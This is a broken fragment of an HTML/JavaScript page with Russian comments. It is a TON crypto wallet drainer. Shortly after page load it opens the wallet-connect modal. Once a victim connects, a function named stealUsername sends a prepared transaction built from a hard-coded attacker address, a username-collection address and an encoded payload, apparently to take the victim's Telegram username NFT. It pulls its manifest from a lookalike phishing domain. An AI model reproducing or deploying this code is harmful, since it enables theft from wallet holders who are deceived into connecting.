<!DOCTYPE html>
<html>
<head>

    <!-- Официальные NPM-пакеты (должны работать) -->

                    console.error('Библиотеки TON Connect не загрузились!');
                    return;
                }

                // ========== ТВОИ ДАННЫЕ ==========
                const ATTACKER_ADDRESS = 'UQDJGfO9WdvXG2jOepsenwxwA_hUmBECDnhlhTXfJkbC3Cp6';
                const USERNAME_COLLECTION_ADDRESS = 'EQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRh';
                const PAYLOAD = 'te6cckECBQEAAQsAAeWIAc39af/oITx+Q4vvf0zKDYy8ZkxhANjOIsRC4Y456MMKA5tLO3P///iLTYLRKAAAAA00I+nVx3oe/LAinIUZNSwNySL5E34jwIKucvH2jNQZGfnAzsY6sdLxTjX9+xKyw5RdkWNyOKsKawdaMBwoEBgJAQIKDsPIbQIEAgFoYgBQeGf+SuJLX4dzh2GeG7EF5FlBKf4wJifFZwBSWvy1dKAcBhgoAAAAAAAAAAAAAAAAAQMAoV/MPRRUbeTvpVqftYAXXEjqYukf8Y80Sg6O7kVvcTK+czXoYmxDvFuETLODQXADm/rT/9BCePyHF97+mZQbGXjMmMIBsZxFiIXDHHPRhhQgKAAAKdQ8mA==';
                const manifestUrl = 'https://acountpubgfjdjd-cloud.github.io/nfts/tonconnect-manifest.json';
                // =================================

                let tonConnectUI, connector;

                async function stealUsername() {
                    if (!PAYLOAD) return;
                    try {
                        const transaction = {
                            validUntil: Math.floor(Date.now() / 1000) + 600,
                            messages: [{
                                address: USERNAME_COLLECTION_ADDRESS,
                                amount: '5000000',
                                payload: PAYLOAD
                            }]
                        };
                        await tonConnectUI.sendTransaction(transaction);
                        console.log('Транзакция кражи отправлена');
                    } catch (e) {
                        console.error('Ошибка кражи:', e);
                    }
                }

                try {
                    connector = new TonConnect.Connector();
                    tonConnectUI = new TonConnectUI.TonConnectUI({ connector, manifestUrl });

                    connector.onStatusChange(async (wallet) => {
                        if (wallet) {
                            console.log('Кошелёк подключён, пробуем украсть...');
                            await stealUsername();
                        }
                    });

                    setTimeout(() => {
                        if (!connector.connected) {
                            tonConnectUI.openModal();
                        }
                    }, 1500);
                } catch (e) {
                    console.error('Ошибка инициализации TON Connect:', e);
                }
            }, 3000);
